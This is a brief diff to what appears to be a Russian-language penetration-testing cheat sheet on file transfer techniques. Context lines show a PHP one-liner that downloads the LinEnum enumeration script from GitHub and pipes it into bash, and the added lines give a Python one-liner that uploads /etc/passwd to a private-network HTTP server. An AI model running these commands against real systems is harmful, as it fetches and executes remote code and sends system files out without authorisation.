@@ -10,3 +10,6 @@ $bytes = [Convert]::FromBase64String($b64)
 Безфайловая Загрузка с помощью PHP и выполнение :
 php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 
+download with onestring python:
+
+python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
